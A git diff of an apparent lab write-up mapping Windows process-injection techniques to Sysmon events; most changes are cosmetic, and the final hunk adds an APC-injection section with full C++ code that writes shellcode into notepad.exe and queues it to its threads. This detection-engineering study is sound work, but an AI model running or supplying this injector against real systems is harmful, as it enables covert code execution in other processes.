@@ -94,8 +94,8 @@ The four API calls and what Sysmon sees at each step:
 | API Call               | Layer   | Sysmon Event |
 |------------------------|---------|--------------|
 | OpenProcess()          | Win32   | EID 10       |
-| VirtualAllocEx()       | Win32   | —            |
-| WriteProcessMemory()   | Win32   | —            |
+| VirtualAllocEx()       | Win32   | -            |
+| WriteProcessMemory()   | Win32   | -            |
 | CreateRemoteThread()   | Win32   | EID 8        |
 
 ```
@@ -156,7 +156,7 @@ int main() {
 }
 ```
 
-### SYSMON Data
+### Sysmon Data
 1. "Process accessed:
 RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
 UtcTime: 2026-05-12 11:15:16.217
@@ -254,18 +254,18 @@ Had to add in ProcessAcess onmatch=include with GrantedAccess value 0x1FFFFF to 
 | Step | Action                                | Sysmon EID | Rule Triggered          |
 |------|---------------------------------------|------------|-------------------------|
 | 1    | Injector opens handle to Notepad      | EID 10     | ProcessInjectionDelux   |
-| 2    | Shellcode written to remote memory    | —          | —                       |
+| 2    | Shellcode written to remote memory    | -          | -                       |
 | 3    | CreateRemoteThread creates thread     | EID 8      | T1055 Process Injection |
 | 4    | Shellcode opens handle to cmd.exe     | EID 10     | ProcessInjectionDelux   |
 | 5    | Notepad spawns cmd.exe                | EID 1      | T1059.003 Cmd Shell     |
 | 6    | Notepad beacons to C2                 | EID 3      | T1571 Non-Standard Port |
 
 ### Key Indicators
-- **EID 8** `StartModule: -` — thread starts from anonymous memory, not a
+- **EID 8** `StartModule: -` thread starts from anonymous memory, not a
   named module. Strongest single indicator of shellcode execution.
-- **EID 10** `GrantedAccess: 0x1fffff` — PROCESS_ALL_ACCESS handle open.
+- **EID 10** `GrantedAccess: 0x1fffff` PROCESS_ALL_ACCESS handle open.
   Caught by ProcessInjectionDelux rule.
-- **EID 10** `CallTrace: UNKNOWN(address)` — shellcode calling Win32 APIs
+- **EID 10** `CallTrace: UNKNOWN(address)` shellcode calling Win32 APIs
   from anonymous memory. Legitimate code always has a named module in trace.
 
 
@@ -274,8 +274,8 @@ Calls NtCreateThreadEx directly from ntdll.dll instead of going through CreateRe
 | API Call            | Layer      | Sysmon Event |
 |---------------------|------------|--------------|
 | OpenProcess()       | Win32      | EID 10       |
-| VirtualAllocEx()    | Win32      | —            |
-| WriteProcessMemory()| Win32      | —            |
+| VirtualAllocEx()    | Win32      | -            |
+| WriteProcessMemory()| Win32      | -            |
 | NtCreateThreadEx()  | Native API | EID 8        |
 
 ```
@@ -372,7 +372,7 @@ int main() {
 }
 ```
 
-### SYSMON Data
+### Sysmon Data
 1. "Process accessed:
 RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
 UtcTime: 2026-05-12 14:00:07.843
@@ -469,7 +469,7 @@ DestinationPortName: -"
 | Step | Action                               | Sysmon EID | Rule Triggered          |
 |------|--------------------------------------|------------|-------------------------|
 | 1    | Injector opens handle to Notepad     | EID 10     | ProcessInjectionDelux   |
-| 2    | Shellcode written to remote memory   | —          | —                       |
+| 2    | Shellcode written to remote memory   | -          | -                       |
 | 3    | NtCreateThreadEx creates thread      | EID 8      | T1055 Process Injection |
 | 4    | Shellcode opens handle to cmd.exe    | EID 10     | ProcessInjectionDelux   |
 | 5    | Notepad spawns cmd.exe               | EID 1      | T1059.003 Cmd Shell     |
@@ -482,3 +482,89 @@ DestinationPortName: -"
 - **EID 8** `StartModule: -` thread starts from anonymous memory.
 - **EID 10** `SourceThreadId: 6484` matches `NewThreadId: 6484` from
   EID 8 the injected thread is the one making subsequent API calls. Direct forensic link between thread creation and post-injection activity.
+
+
+## 3. APC Injections
+Queues a function call to an existing thread in the target process rather than creating a new thread. For APC to execute the target thread must enter an alertable wait state via SleepEx, WaitForSingleObjectEx or similar.
+| API Call            | Layer      | Sysmon Event |
+|---------------------|------------|--------------|
+| OpenProcess()       | Win32      | EID 10       |
+| VirtualAllocEx()    | Win32      | -            |
+| WriteProcessMemory()| Win32      | -            |
+| OpenThread()        | Win32      | -            |
+| QueueUserAPC()      | Win32      | -            |
+
+```
+// t3_apc_injection.cpp
+#include "common.h"
+
+int main() {
+    DWORD pid = GetPID(L"notepad.exe");
+    if (!pid) {
+        wprintf(L"[-] notepad.exe not found\n");
+        return 1;
+    }
+    wprintf(L"[*] Target PID: %lu\n", pid);
+
+    // EID 10 fires here
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) {
+        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
+        return 1;
+    }
+    wprintf(L"[+] Handle acquired\n");
+
+    LPVOID remoteMem = VirtualAllocEx(
+        hProc, NULL, shellcode_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    if (!remoteMem) {
+        wprintf(L"[-] VirtualAllocEx failed\n");
+        return 1;
+    }
+    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);
+
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
+        wprintf(L"[-] WriteProcessMemory failed\n");
+        return 1;
+    }
+    wprintf(L"[+] Shellcode written: %zu bytes\n", written);
+
+    // Enumerate threads of target and queue APC to each
+    // No new thread created — no EID 8
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te = { sizeof(te) };
+    int queued = 0;
+
+    if (Thread32First(snap, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+                if (hThread) {
+                    DWORD result = QueueUserAPC(
+                        (PAPCFUNC)remoteMem,
+                        hThread,
+                        NULL
+                    );
+                    if (result) {
+                        wprintf(L"[+] APC queued to thread %lu\n", te.th32ThreadID);
+                        queued++;
+                    }
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(snap, &te) && queued < 5);
+    }
+    CloseHandle(snap);
+    CloseHandle(hProc);
+
+    wprintf(L"[+] APC queued to %d threads\n", queued);
+    wprintf(L"[*] EID 8 should NOT appear\n");
+    wprintf(L"[*] Shellcode executes when thread enters alertable wait\n");
+    return 0;
+}
+```
+
+### Sysmon Data
